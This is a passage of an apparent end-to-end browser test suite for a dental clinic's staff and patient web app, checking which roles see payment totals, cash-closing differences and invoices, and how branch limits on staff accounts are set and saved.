  for (let n = walk.nextNode(); n; n = walk.nextNode()) {
    if (/Rs\s?[\d,]+/.test(n.textContent) && !(allowedSel && n.parentElement.closest(allowedSel))) out.push(n.textContent.trim());
  }
  return out;
}, allowed);
const pfin = await newPage();
await step('money: the access list has "Today\'s payments, one by one (no totals)", on for the front desk and the accountant; Dr. Ali sets the grid as the clinic has it', async () => {
  await loginAs(pfin, 'Dr. Ali Rashid');
  await pfin.goto(BASE + '#/staff/admin?tab=access');
  await pfin.waitForSelector('table.perm-grid');
  const box = (role) => pfin.getByLabel(`${role}: Today's payments, one by one (no totals)`, { exact: true });
  assert.deepEqual(await Promise.all(['Front desk', 'Assistant', 'Doctor', 'Clinic coordinator', 'Accountant'].map((r) => box(r).isChecked())), [true, false, false, false, true],
    'on for front desk and accountant, off for assistant, doctor and coordinator');
  // Live today: "View invoices and payments" and "Give discounts" are for accounts and Dr. Ali; the front desk makes invoices and takes
  // payments ("Create invoices and take payments", 20261015000500: the owner, "yes the front desk takes the payment").
  for (const label of ['Front desk: View invoices and payments', 'Front desk: Give discounts within cap', 'Clinic coordinator: View invoices and payments']) {
    await pfin.getByLabel(label, { exact: true }).uncheck();
    await pfin.waitForSelector(`.toast:has-text("${label} removed.")`);
  }
  assert.ok(await pfin.getByLabel('Front desk: Create invoices and take payments', { exact: true }).isChecked(), 'the front desk bills');
});
await step('money: the front desk sees today\'s payments of its branch one by one (patient, amount, method, who took it) and no total anywhere on its pages', async () => {
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Front desk \\(North Nazimabad\\)');
  const panel = pfin.locator('.day-payments-panel');
  await panel.locator('table.day-payments tbody tr').first().waitFor();
  const rows = await panel.locator('table.day-payments tbody tr').evaluateAll((trs) => trs.map((tr) => [...tr.children].slice(1).map((td) => td.innerText.replace(/\s+/g, ' ').trim())));
  assert.deepEqual(rows, [
    ['Kinza Rauf Mr# 9825', 'Rs 8,000', 'Card', 'North Nazimabad', 'Accountant (sample)'],
    ['Mariam Akhtar Mr# 9824', 'Rs 2,500', 'Cash', 'North Nazimabad', 'Accountant (sample)'],
  ], 'each payment of today at North Nazimabad, newest first (not Gulshan\'s or Lahore\'s)');
  assert.deepEqual(await panel.locator('thead th').allInnerTexts(), ['Time', 'Patient', 'Amount', 'Method', 'Branch', 'Taken by']);
  assert.equal(await panel.locator('tfoot').count(), 0, 'no total row');
  assert.equal((await panel.innerText()).match(/Rs [\d,]+/g).length, rows.length, 'one amount per payment and no sum');
  assert.deepEqual(await rupeesShown(pfin, '.day-payments td'), [], 'Today: no rupees outside the single payments (no "Received today", no dues added up)');
  assert.equal(await pfin.locator('.stat:has-text("Received today"), .stat:has-text("Total pending dues")').count(), 0);
  assert.deepEqual(await pfin.locator('h2:text("Branches today") + .table-scroll thead th').allInnerTexts(),
    ['Branch', 'Patients', 'Waiting', 'Completed', 'Patients with dues', 'Cash closing', 'Actions'], 'the branch table counts patients with dues, it does not add up their dues');
  assert.equal(await pfin.locator('.topnav a:text-is("Billing")').count(), 0, 'no Billing page (no "View invoices and payments")');
  // The Aaj ki List: each patient's dues in P.P (the $$ flag), nothing added up.
  await pfin.goto(BASE + '#/staff/sheet');
  await pfin.waitForSelector('table.sheet tbody tr');
  assert.ok(await pfin.locator('table.sheet td.pp .pp-due').count(), 'a patient\'s dues still show in P.P');
  assert.deepEqual(await rupeesShown(pfin, 'td.pp'), [], 'Aaj ki List: no rupees but a patient\'s own dues');
  // A patient who paid today: the desk bills, so the profile has that patient's own invoice and payment (with the receipt to print).
  await pfin.goto(BASE + '#/staff/patients?q=Mariam');
  await pfin.locator('table.list tbody tr a:text("Mariam Akhtar")').click();
  const money = pfin.locator('section.panel:has(h2:text-is("Money"))');
  await money.locator('table.list tbody tr').first().waitFor();
  assert.match(await money.innerText(), /No dues[\s\S]*INV-2026-\d+[\s\S]*Paid/, 'the patient\'s own invoice, paid');
  assert.doesNotMatch(await money.innerText(), /with accounts/);
  await money.locator('summary', { hasText: 'payments' }).click();
  assert.ok(await money.getByRole('button', { name: /^Receipt, / }).count(), 'the receipt of the payment, to print');
  for (const name of ['New invoice', 'Take payment']) assert.ok(await pfin.getByRole('button', { name, exact: true }).count(), name);
  // Reports: no "Highest dues" (every patient's dues added up by branch).
  await pfin.goto(BASE + '#/staff/reports?group=patients&tab=dues');
  await pfin.waitForSelector('.report-tabs .tab');
  assert.ok(!(await pfin.locator('.report-tabs .tab').allInnerTexts()).some((t) => /dues/i.test(t)), 'no "Highest dues" report');
});
await step('money: the front desk\'s cash closing is a blind count: no expected cash, no difference, "Saved. Accounts will check it."', async () => {
  await pfin.goto(BASE + '#/staff/accounts?tab=cash');
  await pfin.getByLabel('Cash counted').waitFor();
  assert.doesNotMatch(await pfin.locator('main').innerText(), /Cash payments recorded today|Expected|Difference/);
  await pfin.getByLabel('Cash counted').fill('5000');
  await pfin.getByRole('button', { name: 'Close cash for today' }).click();
  await pfin.waitForSelector('.toast:has-text("Saved. Accounts will check it.")');
  const list = pfin.locator('table.cash-closings-blind');
  await list.locator('tbody tr').first().waitFor();
  assert.deepEqual(await list.locator('thead th').allInnerTexts(), ['Date', 'Branch', 'Closed by', 'Accounts']);
  assert.match(await list.locator('tbody tr').first().innerText(), /North Nazimabad\s+Front desk \(North Nazimabad\)\s+Waiting for accounts/);
  assert.deepEqual(await rupeesShown(pfin), [], 'no rupees on the cash closing page');
  // Closing twice is stopped before it is sent.
  await pfin.getByLabel('Cash counted').fill('100');
  await pfin.getByRole('button', { name: 'Close cash for today' }).click();
  await pfin.locator('.field-error, [role="alert"]', { hasText: 'is closed already' }).first().waitFor();
  await pfin.goto(BASE + '#/staff/today');
  await pfin.locator('h2:text("Branches today") + .table-scroll tbody tr .badge', { hasText: /^Closed$/ }).waitFor();
  assert.deepEqual(await rupeesShown(pfin, '.day-payments td'), [], 'Today says "Closed", never how much it was off by');
});
await step('money: the accountant and Dr. Ali still see everything: income, totals, reports and the cash difference', async () => {
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Accountant');
  await pfin.waitForSelector('.stat:has-text("Received today")');
  assert.match(await pfin.locator('.stat:has-text("Received today") strong').innerText(), /^Rs [\d,]+$/);
  const head = await pfin.locator('h2:text("Branches today") + .table-scroll thead th').allInnerTexts();
  assert.ok(head.includes('Received') && head.includes("Dues on today's list"), head.join('|'));
  await pfin.locator('h2:text("Branches today") + .table-scroll tbody tr:has-text("North Nazimabad") .badge', { hasText: 'Closed, off by Rs 2,500' }).waitFor();
  assert.equal(await pfin.locator('.day-payments-panel').count(), 0, 'the list one by one is the front desk\'s; accounts have Billing');
  await pfin.goto(BASE + '#/staff/billing');
  await pfin.locator('.panel-head:has(h2:text("Payments today")) strong', { hasText: 'Rs 19,000' }).waitFor();
  await pfin.goto(BASE + '#/staff/accounts?tab=cash');
  const row = pfin.locator('table.list tbody tr:has-text("North Nazimabad")').first();
  await row.waitFor();
  assert.match(await row.innerText(), /Rs 2,500\s+Rs 5,000\s+Rs 2,500/, 'expected 2,500 (today\'s cash), counted 5,000, difference 2,500');
  await row.getByRole('button', { name: /Verify/ }).click();
  await pfin.locator('.modal').getByRole('button', { name: 'Verify closing' }).click();
  await pfin.waitForSelector('.toast:has-text("Verified.")');
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Dr. Ali Rashid');
  await pfin.waitForSelector('.stat:has-text("Total pending dues")');
  assert.ok(await pfin.locator('.stat:has-text("Received today")').count());
  await pfin.goto(BASE + '#/staff/reports?group=patients');
  await pfin.waitForSelector('.report-tabs .tab');
  assert.ok((await pfin.locator('.report-tabs .tab').allInnerTexts()).some((t) => /Highest dues/.test(t)), 'Dr. Ali has "Highest dues"');
  // Another doctor's log: what was billed, own patients paid and the share (finance.view).
  await pfin.goto(BASE + '#/staff/log');
  await pfin.locator('label:has-text("Doctor") select').selectOption({ label: 'Dr. Hina (sample)' });
  await pfin.locator('table.list tbody tr:has-text("Areeba Siddiqui")').waitFor();
  await pfin.locator('.stat:has-text("Billed from treated visits")').waitFor();
  assert.match(await pfin.locator('.stat:has-text("Billed from treated visits") strong').innerText(), /^Rs [\d,]+$/);
  assert.ok(await pfin.locator('.stat:has-text("Own patients paid")').count(), 'Dr. Ali sees what a doctor\'s own patients paid');
});
await step('money: the assistant and the doctor see no rupees but a patient\'s dues; the doctor\'s own log keeps their own share', async () => {
  for (const who of ['Assistant', 'Dr. Bushra']) {
    await tryAnotherRole(pfin);
    await loginAs(pfin, who);
    await pfin.locator('h2:text("Branches today")').waitFor();
    assert.deepEqual(await rupeesShown(pfin), [], `${who}: no rupees on Today`);
    const head = await pfin.locator('h2:text("Branches today") + .table-scroll thead th').allInnerTexts();
    assert.ok(!head.includes('Received') && !head.includes('Cash closing') && head.includes('Patients with dues'), `${who}: ${head.join('|')}`);
    assert.equal(await pfin.locator('.day-payments-panel').count(), 0, `${who}: no list of payments`);
    // The Aaj ki List of North Nazimabad: each patient's dues in P.P (the $$ flag), nothing added up.
    await pfin.goto(BASE + '#/staff/sheet?branch=2');
    await pfin.waitForSelector('table.sheet tbody tr');
    assert.deepEqual(await rupeesShown(pfin, 'td.pp'), [], `${who}: Aaj ki List: no rupees but a patient's own dues`);
    // A braces patient who owes 15,000: the dues (the hold on treatment) show, the invoices and payments do not.
    await pfin.goto(BASE + '#/staff/patients?q=Hamza');
    await pfin.locator('table.list tbody tr a:text("Hamza Qureshi")').click();
    const money = pfin.locator('section.panel:has(h2:text-is("Money"))');
    await money.waitFor();
    assert.match(await money.innerText(), /Rs 15,000 pending\s+Invoices and payments are with accounts\./, `${who}: the dues, and the invoices are with accounts`);
    assert.doesNotMatch(await money.innerText(), /payments ·|received|Installment plan/, `${who}: no payments and no plan`);
  }
  await pfin.goto(BASE + '#/staff/log');
  await pfin.locator('.stat:has-text("Patients treated")').waitFor();
  assert.ok(await pfin.locator('.stat:has-text("Your share")').count(), 'the doctor\'s own log keeps the share ("See own doctor percentage")');
});
await step('money: the coordinator\'s doctor log has the treatments and counts, no rupees', async () => {
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Clinic coordinator');
  await pfin.goto(BASE + '#/staff/log');
  await pfin.locator('label:has-text("Doctor") select').selectOption({ label: 'Dr. Hina (sample)' });
  await pfin.locator('table.list tbody tr:has-text("Areeba Siddiqui")').waitFor();
  assert.equal(await pfin.locator('.stat:has-text("Patients treated") strong').innerText(), '1');
  assert.ok(await pfin.locator('.stat:has-text("Own patients (brought in)")').count(), 'the count of own patients stays');
  assert.equal(await pfin.locator('.stat:has-text("Billed"), .stat:has-text("Own patients paid"), .stat:has-text("share")').count(), 0, 'no billed amount, payments or share');
  assert.deepEqual(await rupeesShown(pfin), [], 'no rupees on the coordinator\'s doctor log');
  await pfin.goto(BASE + '#/staff/today');
  await pfin.locator('h2:text("Branches today")').waitFor();
  assert.deepEqual(await rupeesShown(pfin), [], 'no rupees on the coordinator\'s Today page');
});
await step('money: the front desk (Create invoices and take payments, no View invoices and payments) makes an invoice, takes a payment, sets up a plan, and sees no totals', async () => {
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Front desk \\(North Nazimabad\\)');
  await pfin.goto(BASE + '#/staff/patients?q=Hamza');
  await pfin.locator('table.list tbody tr a:text("Hamza Qureshi")').click();
  const money = pfin.locator('section.panel:has(h2:text-is("Money"))');
  await money.locator('table.list tbody tr').first().waitFor();
  assert.match(await money.innerText(), /INV-2026-\d+[\s\S]*Rs 15,000 unpaid/, 'the patient\'s own invoice, with what is unpaid');
  // A new invoice (the owner: the front desk makes the invoice and prints the bill), with nothing paid in the same form.
  await pfin.getByRole('button', { name: 'New invoice', exact: true }).click();
  const inv = pfin.locator('.modal:has(h2:has-text("New invoice · Hamza Qureshi"))');
  await inv.getByLabel('Treatment, line 1').fill('Sample bracket repair');
  await inv.getByLabel('Rate (Rs), line 1').fill('1000');
  assert.ok(await inv.getByLabel('Discount, line 1').isDisabled() && await inv.getByLabel('Total discount', { exact: true }).count() === 0, 'no discount ("Give discounts" is off for the desk)');
  await inv.getByLabel('Payment (Rs)').fill('0');
  await inv.getByRole('button', { name: 'Save', exact: true }).click();
  const bill = pfin.locator('.modal', { has: pfin.locator('h2', { hasText: /^Invoice INV-2026-/ }) });
  await bill.waitFor();
  await bill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await pfin.waitForSelector('.modal', { state: 'detached' });
  await money.locator('strong', { hasText: 'Rs 16,000 pending' }).waitFor();
  await money.locator('table.list tbody tr', { hasText: 'Rs 1,000 unpaid' }).waitFor();
  // A payment against it.
  await pfin.getByRole('button', { name: 'Take payment', exact: true }).click();
  const m = pfin.locator('.modal:has(h2:has-text("Take payment · Hamza Qureshi"))');
  await m.getByLabel('For invoice').waitFor();
  assert.match(await m.getByLabel('For invoice').locator('option:checked').innerText(), /unpaid/, 'the payment form matches the money to an unpaid invoice');
  await m.getByLabel('Amount').fill('5000');
  await m.getByRole('button', { name: 'Save payment' }).click();
  await pfin.waitForSelector('.toast:has-text("Payment of Rs 5,000 saved.")');
  await money.locator('strong', { hasText: 'Rs 11,000 pending' }).waitFor();
  // The installment plan section, with its button.
  assert.match(await money.innerText(), /Installment plan/);
  assert.ok(await money.getByRole('button', { name: /Set up a plan|New plan/ }).count(), 'the desk may set up an installment plan');
  await pfin.goto(BASE + '#/staff/today');
  await pfin.locator('table.day-payments tbody tr:has-text("Hamza Qureshi")').waitFor();
  assert.match(await pfin.locator('table.day-payments tbody tr:has-text("Hamza Qureshi")').innerText(), /Rs 5,000\s+Cash\s+North Nazimabad\s+Front desk \(North Nazimabad\)/);
  assert.deepEqual(await rupeesShown(pfin, '.day-payments td'), [], 'still no total on Today');
  assert.equal(await pfin.locator('.stat:has-text("Received today")').count(), 0, 'no "Received today"');
  assert.equal(await pfin.locator('.topnav a:text-is("Billing")').count(), 0, 'and still no Billing page');
});
await step('money: a payment taken at another branch: the front desk does not read it, so its payment form fills in no more than the dues (which count every branch)', async () => {
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Dr. Ali Rashid');
  await pfin.goto(BASE + '#/staff/patients?q=Hamza');
  await pfin.locator('table.list tbody tr a:text("Hamza Qureshi")').click();
  await pfin.getByRole('button', { name: 'Take payment', exact: true }).click();
  const ali = pfin.locator('.modal:has(h2:has-text("Take payment · Hamza Qureshi"))');
  await ali.getByLabel('For invoice').waitFor();
  await ali.getByLabel('Amount').fill('4000');
  await ali.getByLabel('Branch').selectOption('1');
  await ali.getByRole('button', { name: 'Save payment' }).click();
  await pfin.waitForSelector('.toast:has-text("Payment of Rs 4,000 saved.")');
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Front desk \\(North Nazimabad\\)');
  await pfin.goto(BASE + '#/staff/patients?q=Hamza');
  await pfin.locator('table.list tbody tr a:text("Hamza Qureshi")').click();
  const money = pfin.locator('section.panel:has(h2:text-is("Money"))');
  await money.locator('strong', { hasText: 'Rs 7,000 pending' }).waitFor();
  await pfin.getByRole('button', { name: 'Take payment', exact: true }).click();
  const m = pfin.locator('.modal:has(h2:has-text("Take payment · Hamza Qureshi"))');
  await m.getByLabel('For invoice').waitFor();
  assert.match(await m.getByLabel('For invoice').locator('option:checked').innerText(), /Rs 10,000 unpaid/, 'the Gulshan payment is not on the desk\'s invoice');
  assert.equal(await m.getByLabel('Amount').inputValue(), '7000', 'the amount filled in is the dues, not the invoice\'s 10,000');
  await m.getByRole('button', { name: 'Cancel' }).click();
});
await step('money: with "Create invoices and take payments" unticked for the front desk, a patient\'s invoices and payments are with accounts', async () => {
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Dr. Ali Rashid');
  await pfin.goto(BASE + '#/staff/admin?tab=access');
  await pfin.getByLabel('Front desk: Create invoices and take payments', { exact: true }).uncheck();
  await pfin.waitForSelector('.toast:has-text("Front desk: Create invoices and take payments removed.")');
  await tryAnotherRole(pfin);
  await loginAs(pfin, 'Front desk \\(North Nazimabad\\)');
  await pfin.goto(BASE + '#/staff/patients?q=Hamza');
  await pfin.locator('table.list tbody tr a:text("Hamza Qureshi")').click();
  const money = pfin.locator('section.panel:has(h2:text-is("Money"))');
  await money.waitFor();
  assert.match(await money.innerText(), /Rs 7,000 pending\s+Invoices and payments are with accounts\./);
  for (const name of ['New invoice', 'Take payment']) assert.equal(await pfin.getByRole('button', { name, exact: true }).count(), 0, `no ${name}`);
});
await pfin.close();

// ------------------------------------------------------------- admin
const p4 = await newPage();
await step('admin: access list checkboxes change permissions', async () => {
  await loginAs(p4, 'Dr. Ali Rashid');
  await p4.locator('.topnav .menu:has-text("More") > button').click();
  await p4.locator('.topnav .menu-list a:has-text("Access list")').click();
  await p4.waitForSelector('table.perm-grid');
  const box = p4.getByLabel('Assistant: Register new patients (auto Mr#)');
  assert.equal(await box.isChecked(), false);
  await box.check();
  await p4.waitForSelector('.toast:has-text("allowed")');
  await shot(p4, '06-access-list');
});
await step('admin: dashboard, Dr. Ali list and complaints', async () => {
  await p4.click('.topnav a:has-text("Today")');
  await p4.waitForSelector('.stat');
  await shot(p4, '07-today');
  await p4.locator('.topnav .menu:has-text("More") > button').click();
  await p4.locator('.topnav .menu-list a:has-text("Dr. Ali\'s list")').click();
  await p4.waitForSelector('table.list');
  assert.ok((await p4.locator('table.list tr').count()) >= 1);
  await p4.goto(BASE + '#/staff/complaints');
  await p4.waitForSelector('table.list');
});
await step('admin: patient profile with braces guidance', async () => {
  await p4.click('.topnav a:has-text("Patients")');
  await p4.waitForSelector('table.list tbody tr');
  await p4.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p4.waitForSelector('h2:has-text("Braces")');
  await shot(p4, '08-patient-profile');
});
await step('admin: adds a consent form to the patient record', async () => {
  await p4.waitForSelector('h2:has-text("Documents")');
  await p4.click('button:has-text("Add document")');
  await p4.setInputFiles('.modal input[type=file]', { name: 'consent.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 test') });
  await p4.click('.modal button:has-text("Save")');
  await p4.waitForSelector('.toast:has-text("Document saved")');
  await p4.waitForSelector('table.list td:has-text("Consent form")');
  assert.ok(await p4.locator('a:has-text("Open")').count());
});

// ------------------------------------------------------------- patient portal
const p5 = await newPage({ width: 390, height: 844 });
await step('patient portal on a phone: complaint goes to Dr. Ali', async () => {
  await p5.goto(BASE + '#/login/patient');
  await p5.click('.demo-accounts button');
  await p5.waitForSelector('h1:has-text("Hello")');
  await shot(p5, '09-portal-mobile');
  await p5.click('button:has-text("Report / complain")');
  await p5.fill('.modal input', 'Waiting time');
  await p5.fill('.modal textarea', 'Waited too long');
  await p5.click('.modal button:has-text("Send to Dr. Ali")');
  await p5.waitForSelector('.toast:has-text("Sent")');
});
await step('sample patient account opens without a login and shows photos, dues and a reply', async () => {
  await p5.goto(BASE + '#/');
  await p5.click('a:has-text("See a sample patient account")');
  await p5.waitForSelector('.sample-banner');
  await p5.waitForSelector('h1:has-text("Hello")');
  assert.equal(await p5.locator('.photo-grid img').count(), 2, 'two sample photos');
  assert.ok(await p5.locator('.alert-info:has-text("Your next appointment")').count(), 'next appointment');
  assert.ok(await p5.locator('text=Reply from the clinic').count(), 'reply shown');
  assert.ok(await p5.locator('button:has-text("Rate this visit")').count(), 'rating button is live');
  await shot(p5, '09b-portal-sample');
});
const p7 = await newPage();
await step('Dr. Ali creates a staff login with a password, then changes its email and password', async () => {
  await loginAs(p7, 'Dr. Ali Rashid');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.getByRole('button', { name: 'New staff account' }).click();
  const m = p7.locator('.modal');
  await m.getByPlaceholder('Full name').fill('Test Reception');
  await m.locator('input[type=email]').fill('test.reception@dralirashid.com');
  const pw = await m.locator('input[autocomplete=new-password]').inputValue();
  assert.match(pw, /^[A-Z][a-z]{4}-\d{4}$/);
  await m.getByRole('button', { name: 'Create account' }).click();
  await p7.waitForSelector('td:text("test.reception@dralirashid.com")');
  await p7.locator('tr', { hasText: 'test.reception@dralirashid.com' }).getByRole('button', { name: /^Login and password/ }).click();
  const lm = p7.locator('.modal');
  await lm.locator('input[type=email]').fill('dha.reception@dralirashid.com');
  await lm.getByLabel(/Set a new password/).check();
  await lm.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('td:text("dha.reception@dralirashid.com")');
  assert.equal(await p7.locator('td:text("test.reception@dralirashid.com")').count(), 0);
  assert.ok(await p7.locator('th:text("Last login")').count(), 'last login column');
  assert.ok(await p7.locator('tr:has-text("Dr. Ali Rashid") td:has-text("Never")').count() === 0, "Dr. Ali's own login is recorded");
  await shot(p7, '11-staff-accounts');
});
// The Branches dialog on Admin → Staff accounts. dha.reception (made above) starts with no limit, so it shows All.
const branchLogin = 'dha.reception@dralirashid.com';
const branchesCell = (page, login) => page.locator('tr', { hasText: login }).locator('td').nth(3);
const openBranches = async (page, login) => { await page.locator('tr', { hasText: login }).getByRole('button', { name: /^Branches/ }).click(); return page.locator('.modal'); };
// Switch the DHA branch off (or on) in Clinic setup, then come back to Staff accounts.
const switchDha = async (open) => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.waitForSelector('h2:text("Treatments")');
  await p7.getByRole('button', { name: 'Edit DHA Karachi', exact: true }).click();
  const bm = p7.locator('.modal');
  const box = bm.getByLabel('Open (shown on the website)');
  if (open) await box.check(); else await box.uncheck();
  await bm.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.waitForSelector(`tr:has-text("${branchLogin}")`);
};
await step('Dr. Ali changes the branches a staff member works at, and is asked before a limit is lifted', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  assert.equal(await p7.locator('tr', { hasText: 'Dr. Ali Rashid' }).getByRole('button', { name: /^Branches/ }).count(), 0, "no Branches button on the admin's own row");
  // An account with no limit starts on All branches; ticking branches clears it.
  let m = await openBranches(p7, branchLogin);
  assert.ok(await m.getByLabel('All branches', { exact: true }).isChecked(), 'no limit starts on All branches');
  // The dialog says what a limit really covers: the Aaj ki List, invoices and payments, not patient records.
  const intro = await m.innerText();
  assert.match(intro, /Aaj ki List, invoices and payments of these branches/);
  assert.match(intro, /patient records are shared by every branch/);
  assert.doesNotMatch(intro, /enter patients/, 'it must not promise that patients are hidden');
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'ticking a branch clears All');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi, Islamabad")`);
  // Reopened, the dialog is ticked from the saved account.
  m = await openBranches(p7, branchLogin);
  assert.ok(await m.getByLabel('DHA Karachi', { exact: true }).isChecked() && await m.getByLabel('Islamabad', { exact: true }).isChecked(), 'ticked from the saved branches');
  assert.ok(!(await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).isChecked()), 'other branches stay unticked');
  // Unticking the last branch means every branch again. That lifts a limit, so Save asks for a tick first.
  const sure = m.getByLabel(/may see every branch/);
  assert.ok(!(await sure.isVisible()), 'no question while the account stays limited');
  await m.getByLabel('DHA Karachi', { exact: true }).uncheck();
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  assert.ok(await m.getByLabel('All branches', { exact: true }).isChecked(), 'clearing the last branch falls back to All');
  assert.ok(await sure.isVisible(), 'lifting the limit asks for a tick');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('[data-field-error]').waitFor();
  assert.ok(await m.isVisible(), 'the dialog stays open until the tick is given');
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'DHA Karachi, Islamabad', 'nothing saved without the tick');
  await sure.check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
  // Setting a limit on an account that had none is never asked about.
  m = await openBranches(p7, branchLogin);
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).check();
  assert.ok(!(await sure.isVisible()), 'no question when a limit is set');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Gulshan (RJ Mall)")`);
});
await step('A switched-off branch is kept when branches are saved, and Save alone cannot lift the limit', async () => {
  // dha.reception works at Gulshan only (set above). Move them to DHA only, then switch DHA off in Clinic setup.
  let m = await openBranches(p7, branchLogin);
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).uncheck();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi")`);
  await switchDha(false);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), '1 switched-off branch', 'a switched-off branch is counted, not left blank');
  m = await openBranches(p7, branchLogin);
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'an account limited to a switched-off branch is not shown as All');
  assert.equal(await m.getByLabel('DHA Karachi', { exact: true }).count(), 0, 'a switched-off branch is not offered');
  assert.match(await m.innerText(), /Also kept: 1 switched-off branch/);
  // Pressing Save without a change must not turn the account into All branches.
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Nothing changed")');
  assert.ok(await m.isVisible(), 'the dialog stays open');
  // Adding a branch keeps the switched-off one.
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()));
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Islamabad, 1 switched-off branch")`);
  // Switch DHA back on: the kept branch is shown by name again. Then put the account back to All.
  await switchDha(true);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'Islamabad, DHA Karachi');
  m = await openBranches(p7, branchLogin);
  await m.getByLabel('All branches', { exact: true }).check();
  await m.getByLabel(/may see every branch/).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
});
await step('"All branches" can be chosen for an account that still has a switched-off branch', async () => {
  // dha.reception is on All (end of the step above). Limit them to DHA, switch DHA off, then choose All branches.
  let m = await openBranches(p7, branchLogin);
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi")`);
  await switchDha(false);
  m = await openBranches(p7, branchLogin);
  const allBox = m.getByLabel('All branches', { exact: true });
  const sure = m.getByLabel(/may see every branch/);
  const keptNote = m.getByText(/Also kept: 1 switched-off branch/);
  assert.ok(!(await allBox.isChecked()) && await keptNote.isVisible(), 'limited to a switched-off branch: All is off and the kept note shows');
  // Clearing the last tick keeps the limit (nothing else to fall back to), as before.
  await m.getByLabel('Islamabad', { exact: true }).check();
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  assert.ok(!(await allBox.isChecked()), 'a switched-off branch is kept: clearing the last tick does not turn All on');
  // An explicit tick on All stands: it used to clear itself again straight away.
  await allBox.check();
  assert.ok(await allBox.isChecked(), 'All branches stays ticked');
  assert.ok(await sure.isVisible(), 'lifting the limit still asks');
  assert.ok(!(await keptNote.isVisible()), 'the kept note goes while All is chosen');
  // Changing their mind: a branch tick takes All off again and brings the note back.
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await allBox.isChecked()) && await keptNote.isVisible() && !(await sure.isVisible()), 'ticking a branch undoes All');
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  await allBox.check();
  // Save alone does not lift the limit; the tick does, and the switched-off branch is let go with it.
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('[data-field-error]').waitFor();
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), '1 switched-off branch', 'nothing saved without the tick');
  await sure.check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
  await switchDha(true);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'All', 'the account is on All, with no limit left behind');
});
await step('An account limited to no branch is shown as locked out and can be repaired from the dialog', async () => {
  // The branches form cannot make this; a mistyped SQL fix can. Create one directly through the demo data layer.
  await p7.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.createStaff({ full_name: 'Locked Out Test', email: 'locked.out@dralirashid.com', role: 'front_desk', branch_ids: [], restrict_to_branches: true });
  });
  await p7.goto(BASE + '#/staff/admin?tab=access');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  const login = 'locked.out@dralirashid.com';
  await p7.waitForSelector(`tr:has-text("${login}")`);
  assert.equal((await branchesCell(p7, login).textContent()).trim(), 'None (locked out)');
  const m = await openBranches(p7, login);
  assert.match(await m.innerText(), /cannot open any patient list/);
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'not shown as All');
  // Save alone changes nothing: it must not quietly give every branch.
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Nothing changed")');
  assert.equal((await branchesCell(p7, login).textContent()).trim(), 'None (locked out)');
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${login}") td:text-is("Gulshan (RJ Mall)")`);
});
await step('A user manager has no Branches button on their own row, and the data layer refuses it too', async () => {
  // Give the sample coordinator the "manage staff accounts" permission for this person only, then sign in as them.
  const setManage = (on) => p7.evaluate(async (v) => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-coord', 'users.manage', v); }, on);
